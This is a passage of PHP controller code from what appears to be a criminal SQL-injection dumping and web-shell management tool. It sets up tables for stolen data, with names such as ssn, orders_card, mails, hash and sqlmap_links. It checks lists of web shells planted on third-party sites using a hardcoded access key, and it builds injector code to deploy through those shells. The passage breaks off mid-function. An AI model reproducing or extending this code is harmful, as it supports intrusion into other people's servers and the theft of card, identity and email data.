			$this->Post->query('ALTER TABLE posts_one ADD country_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'alexa_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'alexa_check') {
		}
		 else {
			$this->d('alexa_check posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD alexa_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'up\'');

		if ($ret[0]['COLUMNS']['Field'] == 'up') {
		}
		 else {
			$this->d('up posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD up int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'color\'');

		if ($ret[0]['COLUMNS']['Field'] == 'color') {
		}
		 else {
			$this->d('color posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD color varchar(50) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'cookies\'');

		if ($ret[0]['COLUMNS']['Field'] == 'cookies') {
		}
		 else {
			$this->d('cookies no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD cookies varchar(500) COLLATE utf8_unicode_ci NOT NULL');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path1\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path1') {
		}
		 else {
			$this->d('path1 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path1 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path2') {
		}
		 else {
			$this->d('path2 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path2 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path3\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path3') {
		}
		 else {
			$this->d('path3 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path3 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'site1\'');

		if ($ret[0]['COLUMNS']['Field'] == 'site1') {
		}
		 else {
			$this->d('site1 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD site1 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'site2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'site2') {
		}
		 else {
			$this->d('site2 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD site2 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'site3\'');

		if ($ret[0]['COLUMNS']['Field'] == 'site3') {
		}
		 else {
			$this->d('site3 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD site3 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path_conf1\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path_conf1') {
		}
		 else {
			$this->d('path_conf1 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path_conf1 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path_conf2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path_conf2') {
		}
		 else {
			$this->d('path_conf2 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path_conf2 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'path_conf3\'');

		if ($ret[0]['COLUMNS']['Field'] == 'path_conf3') {
		}
		 else {
			$this->d('path_conf3 posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD path_conf3 varchar(255) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'http\'');

		if ($ret[0]['COLUMNS']['Field'] == 'http') {
		}
		 else {
			$this->d('http posts_one no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD http varchar(255) NOT NULL DEFAULT \'http://\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'header\'');

		if ($ret[0]['COLUMNS']['Field'] == 'header') {
		}
		 else {
			$this->d('header posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD header varchar(100) NOT NULL DEFAULT \'get\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'sqlmap_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'sqlmap_check') {
		}
		 else {
			$this->d('sqlmap_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD sqlmap_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$ret = $this->Post->query('show columns FROM `posts_one` where `Field` = \'all_check\'');

		if ($ret[0]['COLUMNS']['Field'] == 'all_check') {
		}
		 else {
			$this->d('all_check posts no, sozdaem');
			$this->Post->query('ALTER TABLE posts_one ADD all_check int(3) NOT NULL DEFAULT \'0\'');
		}

		$dump3_1 = 'CREATE TABLE IF NOT EXISTS `orders` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `count_new` int(20) NOT NULL,' . "\r\n" . '  `count_new2` int(10) NOT NULL,' . "\r\n" . '  `check_count` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `card2` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `date` varchar(255) NOT NULL,' . "\r\n" . '  `date_new` varchar(255) NOT NULL,' . "\r\n" . '  `color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=latin1;';
		$this->Post->query($dump3_1);
		$dump3_2 = 'CREATE TABLE IF NOT EXISTS `multis_one` (' . "\r\n" . '  `id` int(11) NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `filed_id` int(11) DEFAULT \'0\',' . "\r\n" . '  `post_id` int(11) DEFAULT \'0\',' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `lastlimit` int(11) DEFAULT \'0\',' . "\r\n" . '  `count` int(11) DEFAULT \'0\',' . "\r\n" . '  `get` int(2) DEFAULT \'0\',' . "\r\n" . '  `potok` int(2) DEFAULT \'0\',' . "\r\n" . '  `function` int(3) DEFAULT \'0\',' . "\r\n" . '  `prich` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `isp` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `dok` int(3) DEFAULT \'0\',' . "\r\n" . '  `date` int(11) DEFAULT \'0\',' . "\r\n" . '  `pid` int(11) NOT NULL DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=MyISAM DEFAULT CHARSET=utf8;' . "\r\n";
		$this->Post->query($dump3_2);
		$dump3_3 = 'CREATE TABLE IF NOT EXISTS `ordersTable_one` (' . "\r\n" . '  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '  `post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '  `shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `table` varchar(255) DEFAULT \'0\',' . "\r\n" . '  `card2` varchar(255) NOT NULL,' . "\r\n" . '  `column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '  `count` int(11) NOT NULL,' . "\r\n" . '  `domen` varchar(255) DEFAULT \'0\',' . "\r\n" . '  PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=latin1 ;';
		$this->Post->query($dump3_3);
		$dump3 = 'CREATE TABLE IF NOT EXISTS `orders_one` (' . "\r\n" . '`id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '`post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '`shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`table` varchar(255) DEFAULT \'0\',' . "\r\n" . '`card2` varchar(255) NOT NULL,' . "\r\n" . '`column` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '`count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '`count` int(11) NOT NULL,' . "\r\n" . '`domen` varchar(255) DEFAULT \'0\',' . "\r\n" . 'PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=latin1;';
		$this->Post->query($dump3);
		$dump4 = 'CREATE TABLE IF NOT EXISTS `ordersTable_one` (' . "\r\n" . '`id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '`post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '`shema` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`bd` varchar(255) NOT NULL DEFAULT \'0\',' . "\r\n" . '`table` varchar(255) DEFAULT \'0\',' . "\r\n" . '`card2` varchar(255) NOT NULL,' . "\r\n" . '`column_16` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '`count_n` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . '`count` int(11) NOT NULL,' . "\r\n" . '`domen` varchar(255) DEFAULT \'0\',' . "\r\n" . 'PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=latin1;';
		$this->Post->query($dump4);
		$dump5 = 'CREATE TABLE IF NOT EXISTS `bds_one` (' . "\r\n" . '`id` int(10) unsigned NOT NULL AUTO_INCREMENT,' . "\r\n" . '`post_id` varchar(255) DEFAULT NULL,' . "\r\n" . '`bd` varchar(255) DEFAULT \'\',' . "\r\n" . '`count` int(11) NOT NULL,' . "\r\n" . '`site` varchar(255) DEFAULT \'0\',' . "\r\n" . '`color` varchar(50) NOT NULL DEFAULT \'0\',' . "\r\n" . '`up` int(3) NOT NULL DEFAULT \'0\',' . "\r\n" . 'PRIMARY KEY (`id`)' . "\r\n" . ') ENGINE=InnoDB DEFAULT CHARSET=latin1;';
		$this->Post->query($dump5);
		$ret = $this->Post->query('show columns FROM `orders` where `Field` = \'count_new2\'');

		if ($ret[0]['COLUMNS']['Field'] == 'count_new2') {
			return;
		}


		$this->d('count_new2 no, sozdaem');
		$this->Post->query('ALTER TABLE orders ADD count_new2 int(20) NOT NULL DEFAULT \'0\'');
	}

	public function empty_databases()
	{
		$this->timeStart = $this->start('empty_databases', 1);
		$sqlp = 'TRUNCATE TABLE `bds_one`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `bds_one`';
		}


		$sqlp = 'TRUNCATE TABLE `domens`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `domens`';
		}


		$sqlp = 'TRUNCATE TABLE `domens_links`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `domens_links`';
		}


		$sqlp = 'TRUNCATE TABLE `fileds`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `fileds`';
		}


		$sqlp = 'TRUNCATE TABLE `hash`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `hash`';
		}


		$sqlp = 'TRUNCATE TABLE `logs`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `logs`';
		}


		$sqlp = 'TRUNCATE TABLE `mails`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `mails`';
		}


		$sqlp = 'TRUNCATE TABLE `mails_one`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `mails_one`';
		}


		$sqlp = 'TRUNCATE TABLE `multis`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `multis`';
		}


		$sqlp = 'TRUNCATE TABLE `m_users`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `m_users`';
		}


		$sqlp = 'TRUNCATE TABLE `orders`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `orders`';
		}


		$sqlp = 'TRUNCATE TABLE `ordersTable_one`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `ordersTable_one`';
		}


		$sqlp = 'TRUNCATE TABLE `orders_card`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `orders_card`';
		}


		$sqlp = 'TRUNCATE TABLE `orders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `orders_one`';
		}


		$sqlp = 'TRUNCATE TABLE `posts`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `posts`';
		}


		$sqlp = 'TRUNCATE TABLE `posts_all`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `posts_all`';
		}


		$sqlp = 'TRUNCATE TABLE `renders`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `renders`';
		}


		$sqlp = 'TRUNCATE TABLE `renders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `renders_one`';
		}


		$sqlp = 'TRUNCATE TABLE `settings`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `settings`';
		}


		$sqlp = 'TRUNCATE TABLE `ssn`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `ssn`';
		}


		$sqlp = 'TRUNCATE TABLE `sqlmap_links`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `sqlmap_links`';
		}


		$sqlp = 'TRUNCATE TABLE `starts`';

		if ($this->Post->query($sqlp)) {
			echo 'TRUNCATE TABLE `starts`';
		}


		$this->stop();
	}

	public function optimize()
	{
		$this->timeStart = $this->start('OPTIMIZEe_baz', 1);
		$sqlp = 'OPTIMIZE TABLE `bds_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `bds_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `domens`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `domens`';
		}


		$sqlp = 'OPTIMIZE TABLE `domens_links`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `domens_links`';
		}


		$sqlp = 'OPTIMIZE TABLE `dumpers_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `dumpers_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `fileds`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `fileds`';
		}


		$sqlp = 'OPTIMIZE TABLE `fileds_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `fileds_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `hash`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `hash`';
		}


		$sqlp = 'OPTIMIZE TABLE `logs`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `logs`';
		}


		$sqlp = 'OPTIMIZE TABLE `mails`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `mails`';
		}


		$sqlp = 'OPTIMIZE TABLE `mails_dumping`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `mails_dumping`';
		}


		$sqlp = 'OPTIMIZE TABLE `mails_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `mails_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `multis`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `multis`';
		}


		$sqlp = 'OPTIMIZE TABLE `multis_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `multis_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `m_users`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `m_users`';
		}


		$sqlp = 'OPTIMIZE TABLE `orders`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `orders`';
		}


		$sqlp = 'OPTIMIZE TABLE `ordersTable_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `ordersTable_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `orders_card`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `orders_card`';
		}


		$sqlp = 'OPTIMIZE TABLE `orders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `orders_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `posts`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `posts`';
		}


		$sqlp = 'OPTIMIZE TABLE `posts_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `posts_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `posts_all`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `posts_all`';
		}


		$sqlp = 'OPTIMIZE TABLE `renders`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `renders`';
		}


		$sqlp = 'OPTIMIZE TABLE `renders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `renders_one`';
		}


		$sqlp = 'OPTIMIZE TABLE `settings`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `settings`';
		}


		$sqlp = 'OPTIMIZE TABLE `ssn`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `ssn`';
		}


		$sqlp = 'OPTIMIZE TABLE `sqlmap_links`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `sqlmap_links`';
		}


		$sqlp = 'OPTIMIZE TABLE `starts`';

		if ($this->Post->query($sqlp)) {
			echo 'OPTIMIZE TABLE `starts`';
		}


		$this->stop();
	}

	public function repaire()
	{
		$this->timeStart = $this->start('repaire_baz', 1);
		$sqlp = 'REPAIR TABLE `bds_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `bds_one`';
		}


		$sqlp = 'REPAIR TABLE `domens`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `domens`';
		}


		$sqlp = 'REPAIR TABLE `domens_links`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `domens_links`';
		}


		$sqlp = 'REPAIR TABLE `dumpers_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `dumpers_one`';
		}


		$sqlp = 'REPAIR TABLE `fileds`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `fileds`';
		}


		$sqlp = 'REPAIR TABLE `fileds_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `fileds_one`';
		}


		$sqlp = 'REPAIR TABLE `hash`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `hash`';
		}


		$sqlp = 'REPAIR TABLE `logs`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `logs`';
		}


		$sqlp = 'REPAIR TABLE `mails`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `mails`';
		}


		$sqlp = 'REPAIR TABLE `mails_dumping`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `mails_dumping`';
		}


		$sqlp = 'REPAIR TABLE `mails_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `mails_one`';
		}


		$sqlp = 'REPAIR TABLE `multis`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `multis`';
		}


		$sqlp = 'REPAIR TABLE `multis_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `multis_one`';
		}


		$sqlp = 'REPAIR TABLE `m_users`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `m_users`';
		}


		$sqlp = 'REPAIR TABLE `orders`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `orders`';
		}


		$sqlp = 'REPAIR TABLE `ordersTable_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `ordersTable_one`';
		}


		$sqlp = 'REPAIR TABLE `orders_card`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `orders_card`';
		}


		$sqlp = 'REPAIR TABLE `orders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `orders_one`';
		}


		$sqlp = 'REPAIR TABLE `posts`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `posts`';
		}


		$sqlp = 'REPAIR TABLE `posts_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `posts_one`';
		}


		$sqlp = 'REPAIR TABLE `posts_all`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `posts_all`';
		}


		$sqlp = 'REPAIR TABLE `renders`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `renders`';
		}


		$sqlp = 'REPAIR TABLE `renders_one`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `renders_one`';
		}


		$sqlp = 'REPAIR TABLE `settings`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `settings`';
		}


		$sqlp = 'REPAIR TABLE `ssn`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `ssn`';
		}


		$sqlp = 'REPAIR TABLE `sqlmap_links`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `sqlmap_links`';
		}


		$sqlp = 'REPAIR TABLE `starts`';

		if ($this->Post->query($sqlp)) {
			echo 'REPAIR TABLE `starts`';
		}


		$this->stop();
	}

	public function update_all()
	{
		if ($this->Post->query('UPDATE  `multis` SET  `get` =\'3\' WHERE  `get` =\'1\'')) {
			$this->d('update_all');
		}

	}

	public function update_filed()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds`');
		echo 123;

		if (0 < count($poles)) {
		}
		 else {
			exit();
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$ku = $pole['fileds']['id'];
			$this->d('UPDATE `posts` SET filed_id=' . $ku . '  WHERE id=' . $pole['fileds']['post_id']);

			if ($this->Post->query('UPDATE `posts` SET filed_id=' . $ku . '  WHERE id=' . $pole['fileds']['post_id'])) {
				echo $pole['fileds']['post_id'] . ' - ok<br>';
			}

		}
	}

	public function up($id)
	{
		if ($this->Post->query('UPDATE  `fileds` SET  `get` =\'1\',`multi`=1,`up`=1 WHERE `id` =' . $id)) {
			$this->d('filed up ok -' . $id);

			if ($this->Post->query('UPDATE  `multis` SET  `get` =1,`prich`=\'repezapusk\',`dok`=0 WHERE `filed_id` =' . $id)) {
				$this->d('multis up ok -' . $id);
			}

		}

	}

	public function evalpredtest()
	{
		$this->timeStart = $this->start('evalpredtest', 1);
		$original = file('evalpredshelllist.txt');
		$original = array_unique($original);
		shuffle($original);

		foreach ($original as $be ) {
			$be = str_replace('http://', '', $be);

			if (5 < strlen($be)) {
				$be1 = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG', '.php', $be);
				$be1 = trim($be1);
				$be = $be1 . '?q=1';

				if (!(empty($be))) {
					$ctx = stream_context_create(array(
	'http' => array('timeout' => 5)
	));
					$ch = file_get_contents('http://' . $be, false, $ctx);
					if (($ch == 200) || ($ch == '200')) {
						$this->d('http://' . $be);
						$new[] = $be1;
					}


					flush();
				}

			}

		}

		unlink('checkshells.txt');
		$fp = fopen('checkshells.txt', 'a+');
		$new = array_unique($new);

		foreach ($new as $output ) {
			fwrite($fp, $output . "\r\n");
		}

		fclose($fp);
		$this->stop();
	}

	public function badcheksshells($url = '')
	{
		$shell_list = file('shelllist.txt');

		$urls = array();
		foreach ($shell_list as $url ) {
			$url = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG', '.php', $url);
			$url = trim($url);
			$url = $url . '?q=1';
			$urls[] = $url;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$urls = array_unique($urls);
		$count_urls = count($urls);
		$this->d($count_urls, '$count_urls ISHODNO ');
		$fp = fopen('shelllist_new.txt', 'w');
		$kk = 50;
		$i = 0;

		while ($i < $kk) {
			$this->workup();
			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew, $this->time_200, 0);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = null;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

        $good_urls = array();
		while ($active && $mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);

						if ($tasks[$url] != '') {
							if (($tasks[$url] == 200) || ($tasks[$url] == '200')) {
								$url = str_replace('?q=1', '', $url);

								if ($url != '') {
									$good_urls[] = $url;
									fwrite($fp, $url . "\r\n");
								}

							}

						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);

							if ($urlnew != '') {
								$ch = $this->streampars($urlnew, $this->time_200, 0);
								$tasks[$urlnew] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}

						}

					}
					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		curl_multi_close($cmh);
		return $good_urls;
	}

	public function shelltest($good = NULL)
	{
		$this->evaltest($good);

		if ($this->local_shells) {
            $original = file('local_shells.txt');
        } else {
             $original = file('goodshelllist.txt');
            $original = array_unique($original);
		}

		$this->serv = $original;
		$this->set('serv', $this->serv);
	}

	public function checkblackshells()
	{
		$black = file_get_contents('blackshell.txt');
		$shells = file('shelllist.txt');
		$goods = file('goodshelllist.txt');
		$fp2 = fopen('goodshelllist.txt', 'w+');

		foreach ($goods as $str ) {
			$str = str_replace(array('http://', 'https://'), '', $str);
			$url = parse_url('http://' . $str);
			flush();
			$domen = $url['host'];

			if (!(strstr($black, $str))) {
				fwrite($fp2, $str);
			}

		}

		$fp22 = fopen('shelllist.txt', 'w+');

		foreach ($shells as $str2 ) {
			$str2 = str_replace(array('http://', 'https://'), '', $str2);
			$url = parse_url('http://' . $str2);
			flush();
			$domen = $url['host'];

			if (!(strstr($black, $domen))) {
				fwrite($fp22, $str2);
			}

		}

		fclose($fp2);
		fclose($fp22);
		echo 'ok';
	}

	// visit added
    public function build_shell_code($file_with_code) {
        $filename = str_replace('webroot/index.php', 'controllers/components/injector.php', $_SERVER['SCRIPT_FILENAME']);
        $injectorfile = file_get_contents($filename);
        $code = str_replace('URLURL', 'URLURL', file_get_contents($file_with_code));
        $conf = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/config.php');
        $conf = str_replace(array('<?php', '?>'), '', $conf);
        $injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf, $injectorfile);
        $generated = str_replace(array('<?php', '?>'), '', $injconf . $code);
        // file_put_contents("shell.php", $generated);
        return $generated;
    }

    public function set_code($code) {
	    $this->code = $code;
    }
	public function evaltest($good = 'no')
	{
		$check_shell_limit = $this->check_shell_limit;

		$this->d("Check_shell_limits: " . $this->check_shell_limit);

        $original = array();

		if ($good == 'yes') {
			if ($this->local_shells == true) {
                $this->serv = file('local_shells.txt');
				return;
			}
			$original = array_unique(file('shelllist.txt'));
		} else {
			if (
			    // чекаем время последнего чека шеллов
			    (20500 < (time() - intval(filemtime('goodshelllist.txt'))))
                // пуст ли список хороших шеллов
                || (count(file('goodshelllist.txt')) == 0)
            ) {
				if ($this->local_shells == true) {
                    $this->serv = file('local_shells.txt');
					return;
				}

				$original = array_unique(file('shelllist.txt'));
			} else if ($this->local_shells == true) {
                $this->serv = file('local_shells.txt');
				return;
			} else {
                $this->serv = array_unique(file('goodshelllist.txt'));
				$this->d('bez testa shelli');
				return;
			}
		}

        $this->d($original, 'ORIGINAL');

        $this->set_code($this->build_shell_code('ololo.php'));

        $this->d('Code builded');
		$original = $this->badcheksshells();

		$this->d(count($original), 'vsego normal na check');

		array_splice($original, $check_shell_limit);

		$new_count_shells = count($original);
		$this->d($new_count_shells, '$this->check_shell_limit BUDET CHEKATSYA POSLE LIMIT');
		$ev = file('blackshell.txt');
		$ev = array_unique($ev);
		$f2 = fopen('blackshell.txt', 'w');

		foreach ($ev as $item ) {
			fputs($f2, $item);
		}

		fclose($f2);

		$black_shells = file_get_contents('blackshell.txt');
		$i = 0;

